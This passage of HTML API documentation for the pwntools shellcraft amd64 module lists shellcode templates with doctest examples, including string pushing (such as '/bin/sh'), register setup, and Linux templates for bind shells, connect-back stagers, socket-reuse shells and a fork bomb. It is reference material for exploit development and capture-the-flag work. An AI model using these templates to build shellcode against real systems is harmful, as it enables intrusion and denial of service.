<span class="gp">&gt;&gt;&gt; </span><span class="nb">print</span> <span class="n">shellcraft</span><span class="o">.</span><span class="n">amd64</span><span class="o">.</span><span class="n">pushstr</span><span class="p">(</span><span class="s1">&#39;aaaa&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">rstrip</span><span class="p">()</span>
<span class="go">    /* push &#39;aaaa\x00&#39; */</span>
<span class="go">    push 0x61616161</span>
<span class="gp">&gt;&gt;&gt; </span><span class="nb">print</span> <span class="n">shellcraft</span><span class="o">.</span><span class="n">amd64</span><span class="o">.</span><span class="n">pushstr</span><span class="p">(</span><span class="s1">&#39;aaa</span><span class="se">\xc3</span><span class="s1">&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">rstrip</span><span class="p">()</span>
<span class="go">    /* push &#39;aaa\xc3\x00&#39; */</span>
<span class="go">    mov rax, 0x101010101010101</span>
<span class="go">    push rax</span>
<span class="go">    mov rax, 0x101010101010101 ^ 0xc3616161</span>
<span class="go">    xor [rsp], rax</span>
<span class="gp">&gt;&gt;&gt; </span><span class="nb">print</span> <span class="n">shellcraft</span><span class="o">.</span><span class="n">amd64</span><span class="o">.</span><span class="n">pushstr</span><span class="p">(</span><span class="s1">&#39;aaa</span><span class="se">\xc3</span><span class="s1">&#39;</span><span class="p">,</span> <span class="n">append_null</span> <span class="o">=</span> <span class="kc">False</span><span class="p">)</span><span class="o">.</span><span class="n">rstrip</span><span class="p">()</span>
<span class="go">    /* push &#39;aaa\xc3&#39; */</span>
<span class="go">    push -0x3c9e9e9f</span>
<span class="gp">&gt;&gt;&gt; </span><span class="nb">print</span> <span class="n">shellcraft</span><span class="o">.</span><span class="n">amd64</span><span class="o">.</span><span class="n">pushstr</span><span class="p">(</span><span class="s1">&#39;</span><span class="se">\xc3</span><span class="s1">&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">rstrip</span><span class="p">()</span>
<span class="go">    /* push &#39;\xc3\x00&#39; */</span>
<span class="go">    push 0x1010101 ^ 0xc3</span>
<span class="go">    xor dword ptr [rsp], 0x1010101</span>
<span class="gp">&gt;&gt;&gt; </span><span class="nb">print</span> <span class="n">shellcraft</span><span class="o">.</span><span class="n">amd64</span><span class="o">.</span><span class="n">pushstr</span><span class="p">(</span><span class="s1">&#39;</span><span class="se">\xc3</span><span class="s1">&#39;</span><span class="p">,</span> <span class="n">append_null</span> <span class="o">=</span> <span class="kc">False</span><span class="p">)</span><span class="o">.</span><span class="n">rstrip</span><span class="p">()</span>
<span class="go">    /* push &#39;\xc3&#39; */</span>
<span class="go">    push -0x3d</span>
<span class="gp">&gt;&gt;&gt; </span><span class="k">with</span> <span class="n">context</span><span class="o">.</span><span class="n">local</span><span class="p">():</span>
<span class="gp">... </span>   <span class="n">context</span><span class="o">.</span><span class="n">arch</span> <span class="o">=</span> <span class="s1">&#39;amd64&#39;</span>
<span class="gp">... </span>   <span class="nb">print</span> <span class="n">enhex</span><span class="p">(</span><span class="n">asm</span><span class="p">(</span><span class="n">shellcraft</span><span class="o">.</span><span class="n">pushstr</span><span class="p">(</span><span class="s2">&quot;/bin/sh&quot;</span><span class="p">)))</span>
<span class="go">48b801010101010101015048b82e63686f2e72690148310424</span>
<span class="gp">&gt;&gt;&gt; </span><span class="k">with</span> <span class="n">context</span><span class="o">.</span><span class="n">local</span><span class="p">():</span>
<span class="gp">... </span>   <span class="n">context</span><span class="o">.</span><span class="n">arch</span> <span class="o">=</span> <span class="s1">&#39;amd64&#39;</span>
<span class="gp">... </span>   <span class="nb">print</span> <span class="n">enhex</span><span class="p">(</span><span class="n">asm</span><span class="p">(</span><span class="n">shellcraft</span><span class="o">.</span><span class="n">pushstr</span><span class="p">(</span><span class="s2">&quot;&quot;</span><span class="p">)))</span>
<span class="go">6a01fe0c24</span>
<span class="gp">&gt;&gt;&gt; </span><span class="k">with</span> <span class="n">context</span><span class="o">.</span><span class="n">local</span><span class="p">():</span>
<span class="gp">... </span>   <span class="n">context</span><span class="o">.</span><span class="n">arch</span> <span class="o">=</span> <span class="s1">&#39;amd64&#39;</span>
<span class="gp">... </span>   <span class="nb">print</span> <span class="n">enhex</span><span class="p">(</span><span class="n">asm</span><span class="p">(</span><span class="n">shellcraft</span><span class="o">.</span><span class="n">pushstr</span><span class="p">(</span><span class="s2">&quot;</span><span class="se">\x00</span><span class="s2">&quot;</span><span class="p">,</span> <span class="kc">False</span><span class="p">)))</span>
<span class="go">6a01fe0c24</span>
</pre></div>
</div>
<table class="docutils field-list" frame="void" rules="none">
<col class="field-name" />
<col class="field-body" />
<tbody valign="top">
<tr class="field-odd field"><th class="field-name">Parameters:</th><td class="field-body"><ul class="first last simple">
<li><strong>string</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#str" title="(in Python v2.7)"><em>str</em></a>) &#8211; The string to push.</li>
<li><strong>append_null</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#bool" title="(in Python v2.7)"><em>bool</em></a>) &#8211; Whether to append a single NULL-byte before pushing.</li>
</ul>
</td>
</tr>
</tbody>
</table>
</dd></dl>

<dl class="function">
<dt id="pwnlib.shellcraft.amd64.pushstr_array">
<code class="descclassname">pwnlib.shellcraft.amd64.</code><code class="descname">pushstr_array</code><span class="sig-paren">(</span><em>reg</em>, <em>array</em><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/shellcraft/templates/amd64/pushstr_array.asm"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.shellcraft.amd64.pushstr_array" title="Permalink to this definition">¶</a></dt>
<dd><p>Pushes an array/envp-style array of pointers onto the stack.</p>
<table class="docutils field-list" frame="void" rules="none">
<col class="field-name" />
<col class="field-body" />
<tbody valign="top">
<tr class="field-odd field"><th class="field-name">Parameters:</th><td class="field-body"><ul class="first last simple">
<li><strong>reg</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#str" title="(in Python v2.7)"><em>str</em></a>) &#8211; Destination register to hold the pointer.</li>
<li><strong>array</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#str" title="(in Python v2.7)"><em>str</em></a><em>,</em><a class="reference internal" href="index.html#pwnlib.protocols.adb.AdbClient.list" title="pwnlib.protocols.adb.AdbClient.list"><em>list</em></a>) &#8211; Single argument or list of arguments to push.
NULL termination is normalized so that each argument
ends with exactly one NULL byte.</li>
</ul>
</td>
</tr>
</tbody>
</table>
</dd></dl>

<dl class="function">
<dt id="pwnlib.shellcraft.amd64.ret">
<code class="descclassname">pwnlib.shellcraft.amd64.</code><code class="descname">ret</code><span class="sig-paren">(</span><em>return_value=None</em><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/shellcraft/templates/amd64/ret.asm"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.shellcraft.amd64.ret" title="Permalink to this definition">¶</a></dt>
<dd><p>A single-byte RET instruction.</p>
<table class="docutils field-list" frame="void" rules="none">
<col class="field-name" />
<col class="field-body" />
<tbody valign="top">
<tr class="field-odd field"><th class="field-name">Parameters:</th><td class="field-body"><strong>return_value</strong> &#8211; Value to return</td>
</tr>
</tbody>
</table>
</dd></dl>

<dl class="function">
<dt id="pwnlib.shellcraft.amd64.setregs">
<code class="descclassname">pwnlib.shellcraft.amd64.</code><code class="descname">setregs</code><span class="sig-paren">(</span><em>reg_context</em>, <em>stack_allowed=True</em><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/shellcraft/templates/amd64/setregs.asm"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.shellcraft.amd64.setregs" title="Permalink to this definition">¶</a></dt>
<dd><p>Sets multiple registers, taking any register dependencies into account
(i.e., given eax=1,ebx=eax, set ebx first).</p>
<table class="docutils field-list" frame="void" rules="none">
<col class="field-name" />
<col class="field-body" />
<tbody valign="top">
<tr class="field-odd field"><th class="field-name">Parameters:</th><td class="field-body"><ul class="first last simple">
<li><strong>reg_context</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/stdtypes.html#dict" title="(in Python v2.7)"><em>dict</em></a>) &#8211; Desired register context</li>
<li><strong>stack_allowed</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#bool" title="(in Python v2.7)"><em>bool</em></a>) &#8211; Can the stack be used?</li>
</ul>
</td>
</tr>
</tbody>
</table>
<p class="rubric">Example</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="nb">print</span> <span class="n">shellcraft</span><span class="o">.</span><span class="n">setregs</span><span class="p">({</span><span class="s1">&#39;rax&#39;</span><span class="p">:</span><span class="mi">1</span><span class="p">,</span> <span class="s1">&#39;rbx&#39;</span><span class="p">:</span><span class="s1">&#39;rax&#39;</span><span class="p">})</span><span class="o">.</span><span class="n">rstrip</span><span class="p">()</span>
<span class="go">    mov rbx, rax</span>
<span class="go">    push 1</span>
<span class="go">    pop rax</span>
<span class="gp">&gt;&gt;&gt; </span><span class="nb">print</span> <span class="n">shellcraft</span><span class="o">.</span><span class="n">setregs</span><span class="p">({</span><span class="s1">&#39;rax&#39;</span><span class="p">:</span> <span class="s1">&#39;SYS_write&#39;</span><span class="p">,</span> <span class="s1">&#39;rbx&#39;</span><span class="p">:</span><span class="s1">&#39;rax&#39;</span><span class="p">})</span><span class="o">.</span><span class="n">rstrip</span><span class="p">()</span>
<span class="go">    mov rbx, rax</span>
<span class="go">    push SYS_write /* 1 */</span>
<span class="go">    pop rax</span>
<span class="gp">&gt;&gt;&gt; </span><span class="nb">print</span> <span class="n">shellcraft</span><span class="o">.</span><span class="n">setregs</span><span class="p">({</span><span class="s1">&#39;rax&#39;</span><span class="p">:</span><span class="s1">&#39;rbx&#39;</span><span class="p">,</span> <span class="s1">&#39;rbx&#39;</span><span class="p">:</span><span class="s1">&#39;rax&#39;</span><span class="p">,</span> <span class="s1">&#39;rcx&#39;</span><span class="p">:</span><span class="s1">&#39;rbx&#39;</span><span class="p">})</span><span class="o">.</span><span class="n">rstrip</span><span class="p">()</span>
<span class="go">    mov rcx, rbx</span>
<span class="go">    xchg rax, rbx</span>
<span class="gp">&gt;&gt;&gt; </span><span class="nb">print</span> <span class="n">shellcraft</span><span class="o">.</span><span class="n">setregs</span><span class="p">({</span><span class="s1">&#39;rax&#39;</span><span class="p">:</span><span class="mi">1</span><span class="p">,</span> <span class="s1">&#39;rdx&#39;</span><span class="p">:</span><span class="mi">0</span><span class="p">})</span><span class="o">.</span><span class="n">rstrip</span><span class="p">()</span>
<span class="go">    push 1</span>
<span class="go">    pop rax</span>
<span class="go">    cdq /* rdx=0 */</span>
</pre></div>
</div>
</dd></dl>

<dl class="function">
<dt id="pwnlib.shellcraft.amd64.strcpy">
<code class="descclassname">pwnlib.shellcraft.amd64.</code><code class="descname">strcpy</code><span class="sig-paren">(</span><em>dst</em>, <em>src</em><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/shellcraft/templates/amd64/strcpy.asm"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.shellcraft.amd64.strcpy" title="Permalink to this definition">¶</a></dt>
<dd><p>Copies a string</p>
<p class="rubric">Example</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="n">sc</span>  <span class="o">=</span> <span class="s1">&#39;jmp get_str</span><span class="se">\n</span><span class="s1">&#39;</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">sc</span> <span class="o">+=</span> <span class="s1">&#39;pop_str: pop rax</span><span class="se">\n</span><span class="s1">&#39;</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">sc</span> <span class="o">+=</span> <span class="n">shellcraft</span><span class="o">.</span><span class="n">amd64</span><span class="o">.</span><span class="n">strcpy</span><span class="p">(</span><span class="s1">&#39;rsp&#39;</span><span class="p">,</span> <span class="s1">&#39;rax&#39;</span><span class="p">)</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">sc</span> <span class="o">+=</span> <span class="n">shellcraft</span><span class="o">.</span><span class="n">amd64</span><span class="o">.</span><span class="n">linux</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="s1">&#39;rsp&#39;</span><span class="p">,</span> <span class="mi">32</span><span class="p">)</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">sc</span> <span class="o">+=</span> <span class="n">shellcraft</span><span class="o">.</span><span class="n">amd64</span><span class="o">.</span><span class="n">linux</span><span class="o">.</span><span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">sc</span> <span class="o">+=</span> <span class="s1">&#39;get_str: call pop_str</span><span class="se">\n</span><span class="s1">&#39;</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">sc</span> <span class="o">+=</span> <span class="s1">&#39;.asciz &quot;Hello, world</span><span class="se">\\</span><span class="s1">n&quot;&#39;</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">run_assembly</span><span class="p">(</span><span class="n">sc</span><span class="p">)</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span>
<span class="go">&#39;Hello, world\n&#39;</span>
</pre></div>
</div>
</dd></dl>

<dl class="function">
<dt id="pwnlib.shellcraft.amd64.strlen">
<code class="descclassname">pwnlib.shellcraft.amd64.</code><code class="descname">strlen</code><span class="sig-paren">(</span><em>string</em>, <em>reg='rcx'</em><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/shellcraft/templates/amd64/strlen.asm"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.shellcraft.amd64.strlen" title="Permalink to this definition">¶</a></dt>
<dd><p>Calculate the length of the specified string.</p>
<table class="docutils field-list" frame="void" rules="none">
<col class="field-name" />
<col class="field-body" />
<tbody valign="top">
<tr class="field-odd field"><th class="field-name">Parameters:</th><td class="field-body"><ul class="first last simple">
<li><strong>string</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#str" title="(in Python v2.7)"><em>str</em></a>) &#8211; Register or address with the string</li>
<li><strong>reg</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#str" title="(in Python v2.7)"><em>str</em></a>) &#8211; Named register to return the value in,
rcx is the default.</li>
</ul>
</td>
</tr>
</tbody>
</table>
<p class="rubric">Example</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="n">sc</span>  <span class="o">=</span> <span class="s1">&#39;jmp get_str</span><span class="se">\n</span><span class="s1">&#39;</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">sc</span> <span class="o">+=</span> <span class="s1">&#39;pop_str: pop rdi</span><span class="se">\n</span><span class="s1">&#39;</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">sc</span> <span class="o">+=</span> <span class="n">shellcraft</span><span class="o">.</span><span class="n">amd64</span><span class="o">.</span><span class="n">strlen</span><span class="p">(</span><span class="s1">&#39;rdi&#39;</span><span class="p">,</span> <span class="s1">&#39;rax&#39;</span><span class="p">)</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">sc</span> <span class="o">+=</span> <span class="s1">&#39;push rax;&#39;</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">sc</span> <span class="o">+=</span> <span class="n">shellcraft</span><span class="o">.</span><span class="n">amd64</span><span class="o">.</span><span class="n">linux</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="s1">&#39;rsp&#39;</span><span class="p">,</span> <span class="mi">8</span><span class="p">)</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">sc</span> <span class="o">+=</span> <span class="n">shellcraft</span><span class="o">.</span><span class="n">amd64</span><span class="o">.</span><span class="n">linux</span><span class="o">.</span><span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">sc</span> <span class="o">+=</span> <span class="s1">&#39;get_str: call pop_str</span><span class="se">\n</span><span class="s1">&#39;</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">sc</span> <span class="o">+=</span> <span class="s1">&#39;.asciz &quot;Hello, world</span><span class="se">\\</span><span class="s1">n&quot;&#39;</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">run_assembly</span><span class="p">(</span><span class="n">sc</span><span class="p">)</span><span class="o">.</span><span class="n">unpack</span><span class="p">()</span> <span class="o">==</span> <span class="nb">len</span><span class="p">(</span><span class="s1">&#39;Hello, world</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span>
<span class="go">True</span>
</pre></div>
</div>
</dd></dl>

<dl class="function">
<dt id="pwnlib.shellcraft.amd64.trap">
<code class="descclassname">pwnlib.shellcraft.amd64.</code><code class="descname">trap</code><span class="sig-paren">(</span><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/shellcraft/templates/amd64/trap.asm"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.shellcraft.amd64.trap" title="Permalink to this definition">¶</a></dt>
<dd><p>A trap instruction.</p>
</dd></dl>

<dl class="function">
<dt id="pwnlib.shellcraft.amd64.xor">
<code class="descclassname">pwnlib.shellcraft.amd64.</code><code class="descname">xor</code><span class="sig-paren">(</span><em>key</em>, <em>address</em>, <em>count</em><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/shellcraft/templates/amd64/xor.asm"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.shellcraft.amd64.xor" title="Permalink to this definition">¶</a></dt>
<dd><p>XORs data a constant value.</p>
<table class="docutils field-list" frame="void" rules="none">
<col class="field-name" />
<col class="field-body" />
<tbody valign="top">
<tr class="field-odd field"><th class="field-name">Parameters:</th><td class="field-body"><ul class="first last simple">
<li><strong>key</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#int" title="(in Python v2.7)"><em>int</em></a><em>,</em><a class="reference external" href="https://docs.python.org/2.7/library/functions.html#str" title="(in Python v2.7)"><em>str</em></a>) &#8211; XOR key either as a 8-byte integer,
If a string, length must be a power of two,
and not longer than 8 bytes.
Alternately, may be a register.</li>
<li><strong>address</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#int" title="(in Python v2.7)"><em>int</em></a>) &#8211; Address of the data (e.g. 0xdead0000, &#8216;esp&#8217;)</li>
<li><strong>count</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#int" title="(in Python v2.7)"><em>int</em></a>) &#8211; Number of bytes to XOR, or a register containing
the number of bytes to XOR.</li>
</ul>
</td>
</tr>
</tbody>
</table>
<p class="rubric">Example</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="n">sc</span>  <span class="o">=</span> <span class="n">shellcraft</span><span class="o">.</span><span class="n">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="s1">&#39;rsp&#39;</span><span class="p">,</span> <span class="mi">32</span><span class="p">)</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">sc</span> <span class="o">+=</span> <span class="n">shellcraft</span><span class="o">.</span><span class="n">xor</span><span class="p">(</span><span class="mh">0xdeadbeef</span><span class="p">,</span> <span class="s1">&#39;rsp&#39;</span><span class="p">,</span> <span class="mi">32</span><span class="p">)</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">sc</span> <span class="o">+=</span> <span class="n">shellcraft</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="s1">&#39;rsp&#39;</span><span class="p">,</span> <span class="mi">32</span><span class="p">)</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">io</span> <span class="o">=</span> <span class="n">run_assembly</span><span class="p">(</span><span class="n">sc</span><span class="p">)</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">io</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">cyclic</span><span class="p">(</span><span class="mi">32</span><span class="p">))</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">result</span> <span class="o">=</span> <span class="n">io</span><span class="o">.</span><span class="n">recvn</span><span class="p">(</span><span class="mi">32</span><span class="p">)</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">expected</span> <span class="o">=</span> <span class="n">xor</span><span class="p">(</span><span class="n">cyclic</span><span class="p">(</span><span class="mi">32</span><span class="p">),</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0xdeadbeef</span><span class="p">))</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">result</span> <span class="o">==</span> <span class="n">expected</span>
<span class="go">True</span>
</pre></div>
</div>
</dd></dl>

</div>
<div class="section" id="module-pwnlib.shellcraft.amd64.linux">
<span id="pwnlib-shellcraft-amd64-linux"></span><h6><a class="reference internal" href="#module-pwnlib.shellcraft.amd64.linux" title="pwnlib.shellcraft.amd64.linux"><code class="xref py py-mod docutils literal"><span class="pre">pwnlib.shellcraft.amd64.linux</span></code></a><a class="headerlink" href="#module-pwnlib.shellcraft.amd64.linux" title="Permalink to this headline">¶</a></h6>
<p>Shellcraft module containing Intel x86_64 shellcodes for Linux.</p>
<dl class="function">
<dt id="pwnlib.shellcraft.amd64.linux.bindsh">
<code class="descclassname">pwnlib.shellcraft.amd64.linux.</code><code class="descname">bindsh</code><span class="sig-paren">(</span><em>port</em>, <em>network</em><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/shellcraft/templates/amd64/linux/bindsh.asm"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.shellcraft.amd64.linux.bindsh" title="Permalink to this definition">¶</a></dt>
<dd><p>Listens on a TCP port and spawns a shell for the first to connect.
Port is the TCP port to listen on, network is either &#8216;ipv4&#8217; or &#8216;ipv6&#8217;.</p>
</dd></dl>

<dl class="function">
<dt id="pwnlib.shellcraft.amd64.linux.cat">
<code class="descclassname">pwnlib.shellcraft.amd64.linux.</code><code class="descname">cat</code><span class="sig-paren">(</span><em>filename</em>, <em>fd=1</em><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/shellcraft/templates/amd64/linux/cat.asm"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.shellcraft.amd64.linux.cat" title="Permalink to this definition">¶</a></dt>
<dd><p>Opens a file and writes its contents to the specified file descriptor.</p>
</dd></dl>

<dl class="function">
<dt id="pwnlib.shellcraft.amd64.linux.connect">
<code class="descclassname">pwnlib.shellcraft.amd64.linux.</code><code class="descname">connect</code><span class="sig-paren">(</span><em>host</em>, <em>port</em>, <em>network='ipv4'</em><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/shellcraft/templates/amd64/linux/connect.asm"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.shellcraft.amd64.linux.connect" title="Permalink to this definition">¶</a></dt>
<dd><p>Connects to the host on the specified port.
Network is either &#8216;ipv4&#8217; or &#8216;ipv6&#8217;.
Leaves the connected socket in rbp.</p>
</dd></dl>

<dl class="function">
<dt id="pwnlib.shellcraft.amd64.linux.connectstager">
<code class="descclassname">pwnlib.shellcraft.amd64.linux.</code><code class="descname">connectstager</code><span class="sig-paren">(</span><em>host</em>, <em>port</em>, <em>network='ipv4'</em><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/shellcraft/templates/amd64/linux/connectstager.asm"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.shellcraft.amd64.linux.connectstager" title="Permalink to this definition">¶</a></dt>
<dd><p>connect recvsize stager
:param host, where to connect to:
:param port, which port to connect to:
:param network, ipv4 or ipv6? (default: ipv4)</p>
</dd></dl>

<dl class="function">
<dt id="pwnlib.shellcraft.amd64.linux.dup">
<code class="descclassname">pwnlib.shellcraft.amd64.linux.</code><code class="descname">dup</code><span class="sig-paren">(</span><em>sock='rbp'</em><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/shellcraft/templates/amd64/linux/dup.asm"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.shellcraft.amd64.linux.dup" title="Permalink to this definition">¶</a></dt>
<dd><p>Args: [sock (imm/reg) = rbp]
Duplicates sock to stdin, stdout and stderr</p>
</dd></dl>

<dl class="function">
<dt id="pwnlib.shellcraft.amd64.linux.dupsh">
<code class="descclassname">pwnlib.shellcraft.amd64.linux.</code><code class="descname">dupsh</code><span class="sig-paren">(</span><em>sock='rbp'</em><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/shellcraft/templates/amd64/linux/dupsh.asm"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.shellcraft.amd64.linux.dupsh" title="Permalink to this definition">¶</a></dt>
<dd><p>Args: [sock (imm/reg) = rbp]
Duplicates sock to stdin, stdout and stderr and spawns a shell.</p>
</dd></dl>

<dl class="function">
<dt id="pwnlib.shellcraft.amd64.linux.echo">
<code class="descclassname">pwnlib.shellcraft.amd64.linux.</code><code class="descname">echo</code><span class="sig-paren">(</span><em>string</em>, <em>sock='1'</em><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/shellcraft/templates/amd64/linux/echo.asm"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.shellcraft.amd64.linux.echo" title="Permalink to this definition">¶</a></dt>
<dd><p>Writes a string to a file descriptor</p>
</dd></dl>

<dl class="function">
<dt id="pwnlib.shellcraft.amd64.linux.egghunter">
<code class="descclassname">pwnlib.shellcraft.amd64.linux.</code><code class="descname">egghunter</code><span class="sig-paren">(</span><em>egg</em>, <em>start_address = 0</em><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/shellcraft/templates/amd64/linux/egghunter.asm"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.shellcraft.amd64.linux.egghunter" title="Permalink to this definition">¶</a></dt>
<dd><p>Searches memory for the byte sequence &#8216;egg&#8217;.</p>
<p>Return value is the address immediately following the match,
stored in RDI.</p>
<table class="docutils field-list" frame="void" rules="none">
<col class="field-name" />
<col class="field-body" />
<tbody valign="top">
<tr class="field-odd field"><th class="field-name">Parameters:</th><td class="field-body"><ul class="first last simple">
<li><strong>egg</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#str" title="(in Python v2.7)"><em>str</em></a><em>, </em><a class="reference external" href="https://docs.python.org/2.7/library/functions.html#int" title="(in Python v2.7)"><em>int</em></a>) &#8211; String of bytes, or word-size integer to search for</li>
<li><strong>start_address</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#int" title="(in Python v2.7)"><em>int</em></a>) &#8211; Where to start the search</li>
</ul>
</td>
</tr>
</tbody>
</table>
</dd></dl>

<dl class="function">
<dt id="pwnlib.shellcraft.amd64.linux.findpeer">
<code class="descclassname">pwnlib.shellcraft.amd64.linux.</code><code class="descname">findpeer</code><span class="sig-paren">(</span><em>port=None</em><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/shellcraft/templates/amd64/linux/findpeer.asm"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.shellcraft.amd64.linux.findpeer" title="Permalink to this definition">¶</a></dt>
<dd><p>Args: port (defaults to any port)
Finds a socket, which is connected to the specified port.
Leaves socket in RDI.</p>
</dd></dl>

<dl class="function">
<dt id="pwnlib.shellcraft.amd64.linux.findpeersh">
<code class="descclassname">pwnlib.shellcraft.amd64.linux.</code><code class="descname">findpeersh</code><span class="sig-paren">(</span><em>port=None</em><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/shellcraft/templates/amd64/linux/findpeersh.asm"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.shellcraft.amd64.linux.findpeersh" title="Permalink to this definition">¶</a></dt>
<dd><p>Args: port (defaults to any)
Finds an open socket which connects to a specified
port, and then opens a dup2 shell on it.</p>
</dd></dl>

<dl class="function">
<dt id="pwnlib.shellcraft.amd64.linux.findpeerstager">
<code class="descclassname">pwnlib.shellcraft.amd64.linux.</code><code class="descname">findpeerstager</code><span class="sig-paren">(</span><em>port=None</em><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/shellcraft/templates/amd64/linux/findpeerstager.asm"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.shellcraft.amd64.linux.findpeerstager" title="Permalink to this definition">¶</a></dt>
<dd><p>Findpeer recvsize stager
:param port, the port given to findpeer:
:type port, the port given to findpeer: defaults to any</p>
</dd></dl>

<dl class="function">
<dt id="pwnlib.shellcraft.amd64.linux.forkbomb">
<code class="descclassname">pwnlib.shellcraft.amd64.linux.</code><code class="descname">forkbomb</code><span class="sig-paren">(</span><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/shellcraft/templates/amd64/linux/forkbomb.asm"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.shellcraft.amd64.linux.forkbomb" title="Permalink to this definition">¶</a></dt>
<dd><p>Performs a forkbomb attack.</p>
